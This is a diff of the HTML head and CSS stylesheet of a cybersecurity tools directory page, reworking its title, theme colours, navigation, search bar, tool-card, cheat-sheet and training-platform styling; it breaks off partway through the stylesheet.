@@ -1,484 +1,467 @@
 <!DOCTYPE html>
-<html lang="th">
+<html lang="en" data-theme="dark">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Dorothy — CyberSec Arsenal</title>
-<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Syne:wght@400;700;800&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
+<title>Sinxularity — CyberSec Tools Directory</title>
+<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&family=JetBrains+Mono:wght@300;400;500;700&family=Syne:wght@700;800&display=swap" rel="stylesheet">
 <style>
-* { margin:0; padding:0; box-sizing:border-box; }
 
+/* ═══════════════════════════════════════
+   CSS VARIABLES — DARK / LIGHT THEMES
+═══════════════════════════════════════ */
 :root {
-  --void: #04050a;
-  --deep: #07090f;
-  --surface: #0c0f1a;
-  --card: #0f1320;
-  --card-h: #131827;
-  --dim: rgba(255,255,255,0.055);
-  --dim2: rgba(255,255,255,0.1);
-  --r: #f43f5e;
-  --r-dim: rgba(244,63,94,0.12);
-  --r-border: rgba(244,63,94,0.35);
-  --b: #38bdf8;
-  --b-dim: rgba(56,189,248,0.1);
-  --b-border: rgba(56,189,248,0.3);
-  --txt: #dde4f0;
-  --txt2: #8897b0;
-  --txt3: #3d4f6b;
-  --green: #34d399;
-  --amber: #fbbf24;
+  --bg0: #080b12;
+  --bg1: #0c1018;
+  --bg2: #111622;
+  --bg3: #16202f;
+  --border: rgba(255,255,255,0.07);
+  --border-strong: rgba(255,255,255,0.13);
+  --txt: #e4ecf7;
+  --txt2: #7a91b4;
+  --txt3: #3d5278;
+  --green: #00f5a0;
+  --green-dim: rgba(0,245,160,0.1);
+  --green-border: rgba(0,245,160,0.25);
+  --blue: #38bdf8;
+  --blue-dim: rgba(56,189,248,0.1);
+  --blue-border: rgba(56,189,248,0.25);
   --purple: #a78bfa;
+  --purple-dim: rgba(167,139,250,0.1);
+  --purple-border: rgba(167,139,250,0.25);
+  --red: #f43f5e;
+  --red-dim: rgba(244,63,94,0.1);
+  --amber: #fbbf24;
+  --amber-dim: rgba(251,191,36,0.1);
+  --card-bg: rgba(13,18,28,0.8);
+  --card-hover: rgba(20,28,44,0.95);
+  --shadow: 0 4px 24px rgba(0,0,0,0.4);
+  --shadow-lg: 0 8px 48px rgba(0,0,0,0.6);
+  --radius: 8px;
+  --transition: 0.2s ease;
 }
 
+[data-theme="light"] {
+  --bg0: #f0f4fa;
+  --bg1: #e8eef8;
+  --bg2: #dce5f5;
+  --bg3: #cdd8ee;
+  --border: rgba(0,0,0,0.08);
+  --border-strong: rgba(0,0,0,0.15);
+  --txt: #0f1f3d;
+  --txt2: #3a567a;
+  --txt3: #7a91b4;
+  --green: #059669;
+  --green-dim: rgba(5,150,105,0.08);
+  --green-border: rgba(5,150,105,0.25);
+  --blue: #0369a1;
+  --blue-dim: rgba(3,105,161,0.08);
+  --blue-border: rgba(3,105,161,0.2);
+  --purple: #7c3aed;
+  --purple-dim: rgba(124,58,237,0.08);
+  --purple-border: rgba(124,58,237,0.2);
+  --red: #dc2626;
+  --red-dim: rgba(220,38,38,0.08);
+  --amber: #d97706;
+  --amber-dim: rgba(217,119,6,0.1);
+  --card-bg: rgba(255,255,255,0.9);
+  --card-hover: rgba(255,255,255,1);
+  --shadow: 0 2px 16px rgba(0,0,0,0.1);
+  --shadow-lg: 0 8px 40px rgba(0,0,0,0.15);
+}
+
+/* ═══════════════════════════════════════
+   RESET & BASE
+═══════════════════════════════════════ */
+*, *::before, *::after { margin:0; padding:0; box-sizing:border-box; }
+html { scroll-behavior: smooth; font-size: 16px; }
+
 body {
-  background: var(--void);
+  background: var(--bg0);
   color: var(--txt);
-  font-family: 'Syne', sans-serif;
+  font-family: 'Space Grotesk', sans-serif;
   min-height: 100vh;
+  transition: background 0.3s, color 0.3s;
   overflow-x: hidden;
 }
 
-/* scanlines */
+/* Grid texture */
 body::before {
-  content:'';
-  position:fixed;
-  inset:0;
-  background: repeating-linear-gradient(0deg, transparent, transparent 3px, rgba(0,0,0,0.04) 3px, rgba(0,0,0,0.04) 4px);
-  pointer-events:none;
-  z-index:9999;
-}
-
-html { scroll-behavior: smooth; }
-
-/* ─── SCREENS ─── */
-.screen { display:block; }
-
-/* ══════════════════════════════════
-   LANDING SCREEN
-══════════════════════════════════ */
-#landing {
-  min-height: 100svh;
-  height: 100svh;
-  display: flex;
-  flex-direction: column;
-  align-items: center;
-  justify-content: center;
-  position: relative;
-  overflow: hidden;
-}
-
-.bg-grid {
-  position: absolute;
+  content: '';
+  position: fixed;
   inset: 0;
   background-image:
-    linear-gradient(rgba(255,255,255,0.018) 1px, transparent 1px),
-    linear-gradient(90deg, rgba(255,255,255,0.018) 1px, transparent 1px);
-  background-size: 60px 60px;
-}
-
-.bg-radial-red {
-  position: absolute;
-  width: 600px; height: 600px;
-  left: -200px; top: 50%;
-  transform: translateY(-50%);
-  background: radial-gradient(circle, rgba(244,63,94,0.08) 0%, transparent 70%);
+    linear-gradient(var(--border) 1px, transparent 1px),
+    linear-gradient(90deg, var(--border) 1px, transparent 1px);
+  background-size: 48px 48px;
   pointer-events: none;
+  z-index: 0;
 }
 
-.bg-radial-blue {
-  position: absolute;
-  width: 600px; height: 600px;
-  right: -200px; top: 50%;
-  transform: translateY(-50%);
-  background: radial-gradient(circle, rgba(56,189,248,0.08) 0%, transparent 70%);
-  pointer-events: none;
-}
-
-.landing-inner {
-  position: relative;
-  z-index: 10;
-  text-align: center;
-  padding: 2rem;
-  max-width: 700px;
-}
-
-.logo-area {
-  margin-bottom: 3rem;
-}
-
-.logo-eyebrow {
-  font-family: 'Share Tech Mono', monospace;
-  font-size: 11px;
-  color: var(--green);
-  letter-spacing: 4px;
-  text-transform: uppercase;
-  margin-bottom: 1rem;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  gap: 8px;
-}
-
-.logo-eyebrow::before,
-.logo-eyebrow::after {
+/* Scanlines — dark mode only */
+[data-theme="dark"] body::after {
   content: '';
-  width: 40px;
-  height: 1px;
-  background: linear-gradient(90deg, transparent, var(--green));
-}
-.logo-eyebrow::after { background: linear-gradient(90deg, var(--green), transparent); }
-
-.logo-name {
-  font-family: 'Orbitron', monospace;
-  font-size: clamp(4rem, 12vw, 9rem);
-  font-weight: 900;
-  line-height: 0.9;
-  letter-spacing: -0.02em;
-  position: relative;
-  display: inline-block;
-}
-
-.logo-name .d-letter {
-  background: linear-gradient(135deg, #fff 30%, #8897b0 100%);
-  -webkit-background-clip: text;
-  -webkit-text-fill-color: transparent;
-  background-clip: text;
-}
-
-.logo-name .ot-letters {
-  background: linear-gradient(135deg, #c8d4e8 0%, #4a5a78 100%);
-  -webkit-background-clip: text;
-  -webkit-text-fill-color: transparent;
-  background-clip: text;
-}
-
-.logo-name .hy-letters {
-  background: linear-gradient(135deg, #6b7a96 0%, #2d3a52 100%);
-  -webkit-background-clip: text;
-  -webkit-text-fill-color: transparent;
-  background-clip: text;
-}
-
-.logo-name .underscore-letter {
-  background: linear-gradient(135deg, #34d399 0%, #0f7a52 100%);
-  -webkit-background-clip: text;
-  -webkit-text-fill-color: transparent;
-  background-clip: text;
-  letter-spacing: -0.01em;
-}
-
-.logo-name .void-letters {
-  background: linear-gradient(135deg, #2a3548 0%, #0d1117 100%);
-  -webkit-background-clip: text;
-  -webkit-text-fill-color: transparent;
-  background-clip: text;
-}
-
-.logo-tagline {
-  font-family: 'Share Tech Mono', monospace;
-  font-size: 12px;
-  color: var(--txt3);
-  letter-spacing: 2px;
-  margin-top: 1rem;
-}
-
-.logo-sub {
-  font-size: 15px;
-  color: var(--txt2);
-  margin-top: 0.5rem;
-  letter-spacing: 1px;
-}
-
-/* Team select cards */
-.team-select {
-  display: grid;
-  grid-template-columns: 1fr 1fr;
-  gap: 1.5rem;
-  width: 100%;
-  margin-bottom: 2rem;
-}
-
-.team-btn {
-  position: relative;
-  padding: 2rem 1.5rem;
-  border-radius: 8px;
-  cursor: pointer;
-  transition: all 0.25s;
-  border: 1px solid;
-  background: transparent;
-  text-align: left;
-  overflow: hidden;
-  font-family: inherit;
-}
-
-.team-btn::before {
-  content: '';
-  position: absolute;
+  position: fixed;
   inset: 0;
-  opacity: 0;
-  transition: opacity 0.25s;
+  background: repeating-linear-gradient(0deg, transparent, transparent 3px, rgba(0,0,0,0.03) 3px, rgba(0,0,0,0.03) 4px);
+  pointer-events: none;
+  z-index: 1;
 }
 
-.team-btn-red {
-  border-color: var(--r-border);
-}
-.team-btn-red::before { background: var(--r-dim); }
-.team-btn-red:hover { border-color: var(--r); box-shadow: 0 0 30px rgba(244,63,94,0.12), inset 0 0 30px rgba(244,63,94,0.05); }
-.team-btn-red:hover::before { opacity: 1; }
-
-.team-btn-blue {
-  border-color: var(--b-border);
-}
-.team-btn-blue::before { background: var(--b-dim); }
-.team-btn-blue:hover { border-color: var(--b); box-shadow: 0 0 30px rgba(56,189,248,0.12), inset 0 0 30px rgba(56,189,248,0.05); }
-.team-btn-blue:hover::before { opacity: 1; }
-
-.team-btn-icon {
-  font-size: 2.5rem;
-  margin-bottom: 1rem;
-  display: block;
+/* ═══════════════════════════════════════
+   LAYOUT
+═══════════════════════════════════════ */
+.page-wrap {
   position: relative;
+  z-index: 2;
+  max-width: 1200px;
+  margin: 0 auto;
+  padding: 0 1.5rem;
 }
 
-.team-btn-title {
-  font-family: 'Orbitron', monospace;
-  font-size: 0.9rem;
-  font-weight: 700;
-  letter-spacing: 0.1em;
-  margin-bottom: 0.5rem;
-  position: relative;
-}
-
-.red-text { color: var(--r); }
-.blue-text { color: var(--b); }
-
-.team-btn-desc {
-  font-family: 'Share Tech Mono', monospace;
-  font-size: 11px;
-  color: var(--txt3);
-  letter-spacing: 0.5px;
-  line-height: 1.6;
-  position: relative;
-}
-
-.team-btn-count {
-  position: absolute;
-  top: 1rem;
-  right: 1rem;
-  font-family: 'Share Tech Mono', monospace;
-  font-size: 10px;
-  padding: 2px 8px;
-  border-radius: 2px;
-}
-
-.count-red { background: var(--r-dim); color: var(--r); border: 1px solid var(--r-border); }
-.count-blue { background: var(--b-dim); color: var(--b); border: 1px solid var(--b-border); }
-
-.landing-footer-note {
-  font-family: 'Share Tech Mono', monospace;
-  font-size: 10px;
-  color: var(--txt3);
-  letter-spacing: 1px;
-  display: flex;
-  align-items: center;
-  gap: 6px;
-  justify-content: center;
-}
-
-.warning-dot { width: 6px; height: 6px; border-radius: 50%; background: var(--amber); display: inline-block; animation: pulse 2s infinite; }
-
-@keyframes pulse { 0%,100%{opacity:1;transform:scale(1)} 50%{opacity:0.5;transform:scale(0.8)} }
-
-/* ══════════════════════════════════
-   TOOLS SCREEN
-══════════════════════════════════ */
-#tools-screen {
-  min-height: 100vh;
-  display: none;
-  scroll-margin-top: 0;
-}
-
-/* Top nav */
-.top-nav {
-  display: flex;
-  align-items: center;
-  padding: 1rem 2rem;
-  border-bottom: 1px solid var(--dim);
-  background: rgba(4,5,10,0.95);
-  backdrop-filter: blur(10px);
+/* ═══════════════════════════════════════
+   NAV
+═══════════════════════════════════════ */
+.nav {
   position: sticky;
   top: 0;
-  z-index: 100;
-  gap: 1.5rem;
+  z-index: 1000;
+  background: rgba(8,11,18,0.85);
+  backdrop-filter: blur(20px);
+  -webkit-backdrop-filter: blur(20px);
+  border-bottom: 1px solid var(--border);
+  transition: background 0.3s;
 }
 
-.nav-logo {
-  font-family: 'Orbitron', monospace;
-  font-size: 1.1rem;
-  font-weight: 900;
+[data-theme="light"] .nav {
+  background: rgba(240,244,250,0.9);
+}
+
+.nav-inner {
+  max-width: 1200px;
+  margin: 0 auto;
+  padding: 0 1.5rem;
+  height: 56px;
+  display: flex;
+  align-items: center;
+  gap: 1rem;
+}
+
+.nav-brand {
+  font-family: 'Syne', sans-serif;
+  font-size: 1.15rem;
+  font-weight: 800;
+  letter-spacing: -0.02em;
   color: var(--txt);
-  cursor: pointer;
-  letter-spacing: 0.05em;
   text-decoration: none;
-  flex-shrink: 0;
-}
-
-.nav-logo:hover { color: #fff; }
-
-.nav-team-badge {
   display: flex;
   align-items: center;
   gap: 6px;
-  font-family: 'Share Tech Mono', monospace;
-  font-size: 11px;
-  padding: 4px 12px;
-  border-radius: 3px;
-  letter-spacing: 1px;
   flex-shrink: 0;
 }
 
-.badge-red-nav { background: var(--r-dim); color: var(--r); border: 1px solid var(--r-border); }
-.badge-blue-nav { background: var(--b-dim); color: var(--b); border: 1px solid var(--b-border); }
-
-.nav-filters {
-  display: flex;
-  gap: 0.5rem;
-  flex-wrap: wrap;
-  flex: 1;
-  justify-content: flex-end;
+.nav-brand-dot {
+  width: 8px;
+  height: 8px;
+  border-radius: 50%;
+  background: var(--green);
+  box-shadow: 0 0 8px var(--green);
+  animation: blink 2s infinite;
 }
 
-.flt-btn {
-  font-family: 'Share Tech Mono', monospace;
-  font-size: 11px;
-  padding: 5px 14px;
-  border-radius: 3px;
-  border: 1px solid var(--dim);
-  background: transparent;
+@keyframes blink { 0%,100%{opacity:1} 50%{opacity:0.3} }
+
+.nav-search-wrap {
+  flex: 1;
+  max-width: 420px;
+  position: relative;
+}
+
+.nav-search {
+  width: 100%;
+  padding: 7px 14px 7px 36px;
+  background: var(--bg2);
+  border: 1px solid var(--border-strong);
+  border-radius: 6px;
+  color: var(--txt);
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 12px;
+  outline: none;
+  transition: border-color 0.2s, box-shadow 0.2s;
+}
+
+.nav-search::placeholder { color: var(--txt3); }
+.nav-search:focus { border-color: var(--green); box-shadow: 0 0 0 3px var(--green-dim); }
+
+.search-icon {
+  position: absolute;
+  left: 11px;
+  top: 50%;
+  transform: translateY(-50%);
+  color: var(--txt3);
+  font-size: 13px;
+  pointer-events: none;
+}
+
+.nav-right {
+  display: flex;
+  align-items: center;
+  gap: 0.5rem;
+  margin-left: auto;
+}
+
+.theme-toggle {
+  width: 36px;
+  height: 36px;
+  border-radius: 6px;
+  border: 1px solid var(--border-strong);
+  background: var(--bg2);
   color: var(--txt2);
   cursor: pointer;
-  letter-spacing: 1px;
-  text-transform: uppercase;
-  transition: all 0.15s;
-}
-
-.flt-btn:hover { border-color: var(--dim2); color: var(--txt); background: rgba(255,255,255,0.04); }
-.flt-btn.on { background: rgba(255,255,255,0.07); border-color: var(--dim2); color: var(--txt); }
-.flt-btn.on-r { background: var(--r-dim); border-color: var(--r-border); color: var(--r); }
-.flt-btn.on-b { background: var(--b-dim); border-color: var(--b-border); color: var(--b); }
-
-.back-btn {
-  font-family: 'Share Tech Mono', monospace;
-  font-size: 11px;
-  padding: 5px 12px;
-  border: 1px solid var(--dim);
-  background: transparent;
-  color: var(--txt3);
-  cursor: pointer;
-  border-radius: 3px;
-  letter-spacing: 1px;
-  transition: all 0.15s;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 15px;
+  transition: all 0.2s;
   flex-shrink: 0;
 }
 
-.back-btn:hover { color: var(--txt); border-color: var(--dim2); }
+.theme-toggle:hover { border-color: var(--green); color: var(--green); background: var(--green-dim); }
 
-/* Tools grid */
-.tools-body {
-  padding: 2rem;
-  max-width: 1400px;
-  margin: 0 auto;
-}
-
-.tools-header-bar {
-  display: flex;
-  align-items: center;
-  justify-content: space-between;
-  margin-bottom: 2rem;
-  padding-bottom: 1.5rem;
-  border-bottom: 1px solid var(--dim);
-}
-
-.tools-heading {
-  font-family: 'Orbitron', monospace;
-  font-size: 1.5rem;
-  font-weight: 700;
-}
-
-.tools-count {
-  font-family: 'Share Tech Mono', monospace;
-  font-size: 12px;
-  color: var(--txt3);
-  letter-spacing: 1px;
-}
-
-.section-divider {
-  display: flex;
-  align-items: center;
-  gap: 12px;
-  margin: 2rem 0 1rem;
-}
-
-.section-divider-line {
-  flex: 1;
-  height: 1px;
-  background: var(--dim);
-}
-
-.section-divider-label {
-  font-family: 'Share Tech Mono', monospace;
-  font-size: 10px;
-  letter-spacing: 2px;
-  text-transform: uppercase;
-  padding: 3px 10px;
-  border-radius: 2px;
-  display: flex;
-  align-items: center;
-  gap: 6px;
+.nav-link {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 11px;
+  color: var(--txt2);
+  text-decoration: none;
+  padding: 6px 10px;
+  border-radius: 5px;
+  letter-spacing: 0.5px;
+  transition: all 0.15s;
   white-space: nowrap;
 }
 
-.div-install { background: rgba(251,191,36,0.08); color: var(--amber); border: 1px solid rgba(251,191,36,0.2); }
-.div-browser { background: rgba(167,139,250,0.08); color: var(--purple); border: 1px solid rgba(167,139,250,0.2); }
+.nav-link:hover { color: var(--txt); background: var(--bg2); }
 
-/* Tool cards grid */
-.cards-grid {
+/* ═══════════════════════════════════════
+   HERO
+═══════════════════════════════════════ */
+.hero {
+  padding: 5rem 0 3.5rem;
+  text-align: center;
+  position: relative;
+}
+
+.hero-eyebrow {
+  display: inline-flex;
+  align-items: center;
+  gap: 8px;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 11px;
+  color: var(--green);
+  letter-spacing: 2px;
+  text-transform: uppercase;
+  background: var(--green-dim);
+  border: 1px solid var(--green-border);
+  padding: 4px 14px;
+  border-radius: 100px;
+  margin-bottom: 1.5rem;
+}
+
+.hero-title {
+  font-family: 'Syne', sans-serif;
+  font-size: clamp(2.2rem, 5vw, 4rem);
+  font-weight: 800;
+  letter-spacing: -0.03em;
+  line-height: 1.1;
+  margin-bottom: 1rem;
+}
+
+.hero-title .accent-green { color: var(--green); }
+.hero-title .accent-blue { color: var(--blue); }
+
+.hero-sub {
+  font-size: 1rem;
+  color: var(--txt2);
+  max-width: 520px;
+  margin: 0 auto 2rem;
+  line-height: 1.7;
+}
+
+.hero-stats {
+  display: flex;
+  justify-content: center;
+  gap: 2rem;
+  flex-wrap: wrap;
+}
+
+.hero-stat {
+  text-align: center;
+}
+
+.hero-stat-num {
+  font-family: 'Syne', sans-serif;
+  font-size: 1.6rem;
+  font-weight: 800;
+  color: var(--green);
+  display: block;
+}
+
+.hero-stat-label {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 10px;
+  color: var(--txt3);
+  letter-spacing: 1px;
+  text-transform: uppercase;
+}
+
+/* ═══════════════════════════════════════
+   SEARCH BAR (MAIN)
+═══════════════════════════════════════ */
+.search-section {
+  padding: 0 0 2.5rem;
+}
+
+.search-box-wrap {
+  position: relative;
+  max-width: 600px;
+  margin: 0 auto;
+}
+
+.search-main {
+  width: 100%;
+  padding: 14px 20px 14px 48px;
+  background: var(--bg2);
+  border: 1px solid var(--border-strong);
+  border-radius: var(--radius);
+  color: var(--txt);
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 13px;
+  outline: none;
+  transition: all 0.2s;
+}
+
+.search-main::placeholder { color: var(--txt3); }
+.search-main:focus { border-color: var(--green); box-shadow: 0 0 0 4px var(--green-dim); }
+
+.search-main-icon {
+  position: absolute;
+  left: 16px;
+  top: 50%;
+  transform: translateY(-50%);
+  color: var(--txt3);
+  font-size: 16px;
+  pointer-events: none;
+}
+
+.search-result-count {
+  text-align: center;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 11px;
+  color: var(--txt3);
+  margin-top: 8px;
+  min-height: 16px;
+  transition: color 0.2s;
+}
+
+/* ═══════════════════════════════════════
+   SECTION HEADERS
+═══════════════════════════════════════ */
+.section {
+  margin-bottom: 3.5rem;
+}
+
+.section-header {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  margin-bottom: 1.25rem;
+}
+
+.section-icon {
+  width: 36px;
+  height: 36px;
+  border-radius: 8px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 17px;
+  flex-shrink: 0;
+}
+
+.icon-green { background: var(--green-dim); border: 1px solid var(--green-border); }
+.icon-blue { background: var(--blue-dim); border: 1px solid var(--blue-border); }
+.icon-purple { background: var(--purple-dim); border: 1px solid var(--purple-border); }
+.icon-red { background: var(--red-dim); border: 1px solid rgba(244,63,94,0.25); }
+.icon-amber { background: var(--amber-dim); border: 1px solid rgba(251,191,36,0.25); }
+
+.section-title {
+  font-family: 'Syne', sans-serif;
+  font-size: 1.05rem;
+  font-weight: 700;
+  color: var(--txt);
+  letter-spacing: -0.01em;
+}
+
+.section-count {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 10px;
+  color: var(--txt3);
+  background: var(--bg2);
+  border: 1px solid var(--border);
+  padding: 2px 8px;
+  border-radius: 100px;
+  margin-left: 4px;
+}
+
+.section-line {
+  flex: 1;
+  height: 1px;
+  background: var(--border);
+}
+
+/* ═══════════════════════════════════════
+   TOOL CARDS GRID
+═══════════════════════════════════════ */
+.tools-grid {
   display: grid;
-  grid-template-columns: repeat(auto-fill, minmax(340px, 1fr));
+  grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
   gap: 1rem;
 }
 
 .tool-card {
-  background: var(--card);
-  border-radius: 6px;
-  border: 1px solid var(--dim);
+  background: var(--card-bg);
+  border: 1px solid var(--border);
+  border-radius: var(--radius);
   overflow: hidden;
-  text-decoration: none;
-  color: inherit;
-  display: block;
-  transition: transform 0.2s, border-color 0.2s, box-shadow 0.2s;
+  transition: transform 0.2s, box-shadow 0.2s, border-color 0.2s, background 0.2s;
   position: relative;
+  display: flex;
+  flex-direction: column;
 }
-
-.tool-card-accent {
-  position: absolute;
-  left: 0; top: 0; bottom: 0;
-  width: 3px;
-}
-
-.acc-r { background: linear-gradient(180deg, var(--r) 0%, rgba(244,63,94,0.2) 100%); }
-.acc-b { background: linear-gradient(180deg, var(--b) 0%, rgba(56,189,248,0.2) 100%); }
 
 .tool-card:hover {
-  transform: translateY(-2px);
-  border-color: var(--dim2);
+  transform: translateY(-3px);
+  box-shadow: var(--shadow-lg);
+  background: var(--card-hover);
+  border-color: var(--border-strong);
 }
 
-.card-r:hover { box-shadow: 0 8px 30px rgba(244,63,94,0.08); }
-.card-b:hover { box-shadow: 0 8px 30px rgba(56,189,248,0.08); }
+.card-accent {
+  height: 3px;
+  width: 100%;
+}
 
-.card-inner {
-  padding: 1.25rem 1.25rem 1.25rem 1.5rem;
+.acc-green { background: linear-gradient(90deg, var(--green), transparent); }
+.acc-blue { background: linear-gradient(90deg, var(--blue), transparent); }
+.acc-purple { background: linear-gradient(90deg, var(--purple), transparent); }
+.acc-red { background: linear-gradient(90deg, var(--red), transparent); }
+.acc-amber { background: linear-gradient(90deg, var(--amber), transparent); }
+
+.card-body {
+  padding: 1.1rem 1.2rem;
+  flex: 1;
+  display: flex;
+  flex-direction: column;
 }
 
 .card-top {
@@ -486,686 +469,1497 @@ html { scroll-behavior: smooth; }
   align-items: flex-start;
   justify-content: space-between;
   gap: 8px;
-  margin-bottom: 0.6rem;
+  margin-bottom: 0.5rem;
 }
 
 .card-name {
-  font-family: 'Share Tech Mono', monospace;
-  font-size: 15px;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 14px;
   font-weight: 700;
-  color: #fff;
-  letter-spacing: 0.3px;
-  line-height: 1.3;
+  color: var(--txt);
+  letter-spacing: 0.2px;
+  line-height: 1.4;
 }
 
 .card-badges {
   display: flex;
   gap: 4px;
+  flex-shrink: 0;
   flex-wrap: wrap;
   justify-content: flex-end;
-  flex-shrink: 0;
 }
 
 .badge {
-  font-family: 'Share Tech Mono', monospace;
+  font-family: 'JetBrains Mono', monospace;
   font-size: 9px;
   padding: 2px 7px;
-  border-radius: 2px;
-  letter-spacing: 0.8px;
-  text-transform: uppercase;
-  font-weight: 700;
+  border-radius: 100px;
+  letter-spacing: 0.5px;
+  font-weight: 500;
   white-space: nowrap;
 }
 
-.b-os { background: rgba(251,191,36,0.12); color: var(--amber); border: 1px solid rgba(251,191,36,0.25); }
-.b-free { background: rgba(52,211,153,0.1); color: var(--green); border: 1px solid rgba(52,211,153,0.25); }
-.b-paid { background: rgba(244,63,94,0.1); color: #fb7185; border: 1px solid rgba(244,63,94,0.2); }
-.b-web { background: rgba(167,139,250,0.1); color: var(--purple); border: 1px solid rgba(167,139,250,0.25); }
-
-.card-use {
-  font-family: 'Share Tech Mono', monospace;
-  font-size: 10px;
-  letter-spacing: 0.8px;
-  text-transform: uppercase;
-  margin-bottom: 0.5rem;
-  opacity: 0.7;
-}
-.use-r { color: var(--r); }
-.use-b { color: var(--b); }
+.badge-free { background: var(--green-dim); color: var(--green); border: 1px solid var(--green-border); }
+.badge-paid { background: var(--amber-dim); color: var(--amber); border: 1px solid rgba(251,191,36,0.3); }
+.badge-web { background: var(--blue-dim); color: var(--blue); border: 1px solid var(--blue-border); }
+.badge-ai { background: var(--purple-dim); color: var(--purple); border: 1px solid var(--purple-border); }
+.badge-cli { background: var(--red-dim); color: var(--red); border: 1px solid rgba(244,63,94,0.3); }
 
 .card-desc {
-  font-size: 14px;
+  font-size: 13px;
   color: var(--txt2);
   line-height: 1.65;
-  font-family: 'Syne', sans-serif;
-  font-weight: 400;
+  margin-bottom: 1rem;
+  flex: 1;
 }
 
-.card-tags {
+/* Cheat sheet */
+.cheatsheet {
+  background: var(--bg0);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  overflow: hidden;
+}
+
+[data-theme="light"] .cheatsheet { background: var(--bg2); }
+
+.cheatsheet-header {
   display: flex;
-  gap: 4px;
-  flex-wrap: wrap;
-  margin-top: 0.9rem;
-  padding-top: 0.9rem;
-  border-top: 1px solid var(--dim);
+  align-items: center;
+  justify-content: space-between;
+  padding: 6px 10px;
+  border-bottom: 1px solid var(--border);
 }
 
-.tag {
-  font-family: 'Share Tech Mono', monospace;
+.cheatsheet-label {
+  font-family: 'JetBrains Mono', monospace;
   font-size: 9px;
   color: var(--txt3);
-  background: rgba(255,255,255,0.025);
-  border: 1px solid rgba(255,255,255,0.05);
-  padding: 2px 7px;
-  border-radius: 2px;
+  letter-spacing: 1px;
+  text-transform: uppercase;
+}
+
+.cheatsheet-dots {
+  display: flex;
+  gap: 4px;
+}
+
+.dot { width: 7px; height: 7px; border-radius: 50%; }
+.dot-r { background: #f43f5e; }
+.dot-y { background: #fbbf24; }
+.dot-g { background: #34d399; }
+
+.cheatsheet-code {
+  padding: 10px;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 11px;
+  color: var(--green);
+  line-height: 1.7;
+  white-space: pre;
+  overflow-x: auto;
+}
+
+[data-theme="light"] .cheatsheet-code { color: var(--green); }
+
+.card-footer-row {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  margin-top: 0.85rem;
+  padding-top: 0.85rem;
+  border-top: 1px solid var(--border);
+}
+
+.card-link {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 10px;
+  color: var(--txt3);
+  text-decoration: none;
+  display: flex;
+  align-items: center;
+  gap: 4px;
+  transition: color 0.15s;
   letter-spacing: 0.5px;
 }
 
-.card-footer {
-  display: flex;
-  align-items: center;
-  justify-content: flex-end;
-  padding: 0.5rem 1.25rem 0.75rem 1.5rem;
-  background: rgba(0,0,0,0.2);
-  border-top: 1px solid var(--dim);
+.card-link:hover { color: var(--blue); }
+.card-link::after { content: '↗'; font-size: 11px; }
+
+/* ═══════════════════════════════════════
+   PLATFORM CARDS (Training)
+═══════════════════════════════════════ */
+.platforms-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fill, minmax(260px, 1fr));
+  gap: 1rem;
 }
 
-.card-link-hint {
-  font-family: 'Share Tech Mono', monospace;
+.platform-card {
+  background: var(--card-bg);
+  border: 1px solid var(--border);
+  border-radius: var(--radius);
+  padding: 1.4rem;
+  text-decoration: none;
+  color: inherit;
+  display: block;
+  transition: all 0.2s;
+  position: relative;
+  overflow: hidden;
+}
+
+.platform-card::before {
+  content: '';
+  position: absolute;
+  inset: 0;
+  opacity: 0;
+  transition: opacity 0.2s;
+}
+
+.platform-card:hover { transform: translateY(-3px); box-shadow: var(--shadow-lg); border-color: var(--border-strong); }
+.platform-card:hover::before { opacity: 1; }
+
+.plat-green::before { background: var(--green-dim); }
+.plat-blue::before { background: var(--blue-dim); }
+.plat-purple::before { background: var(--purple-dim); }
+.plat-amber::before { background: var(--amber-dim); }
+.plat-red::before { background: var(--red-dim); }
+
+.platform-icon { font-size: 2rem; margin-bottom: 0.75rem; position: relative; }
+.platform-name {
+  font-family: 'Syne', sans-serif;
+  font-size: 1rem;
+  font-weight: 700;
+  margin-bottom: 0.4rem;
+  position: relative;
+}
+.plat-green .platform-name { color: var(--green); }
+.plat-blue .platform-name { color: var(--blue); }
+.plat-purple .platform-name { color: var(--purple); }
+.plat-amber .platform-name { color: var(--amber); }
+.plat-red .platform-name { color: var(--red); }
+
+.platform-desc {
+  font-size: 13px;
+  color: var(--txt2);
+  line-height: 1.6;
+  position: relative;
+  margin-bottom: 1rem;
+}
+
+.platform-tag {
+  font-family: 'JetBrains Mono', monospace;
   font-size: 10px;
   color: var(--txt3);
-  letter-spacing: 1px;
+  letter-spacing: 0.5px;
+  position: relative;
+}
+
+/* ═══════════════════════════════════════
+   ABOUT / PORTFOLIO
+═══════════════════════════════════════ */
+.about-section {
+  margin-bottom: 4rem;
+}
+
+.about-card {
+  background: var(--card-bg);
+  border: 1px solid var(--border);
+  border-radius: 12px;
+  padding: 2.5rem;
+  display: grid;
+  grid-template-columns: auto 1fr;
+  gap: 2rem;
+  align-items: start;
+  position: relative;
+  overflow: hidden;
+}
+
+.about-card::before {
+  content: '';
+  position: absolute;
+  top: 0; left: 0; right: 0;
+  height: 3px;
+  background: linear-gradient(90deg, var(--green), var(--blue), var(--purple));
+}
+
+.about-avatar-wrap {
+  flex-shrink: 0;
   display: flex;
-  align-items: center;
-  gap: 4px;
-}
-
-.card-link-hint::after { content: '→'; }
-
-.tool-card:hover .card-link-hint { color: var(--txt2); }
-
-/* hidden state */
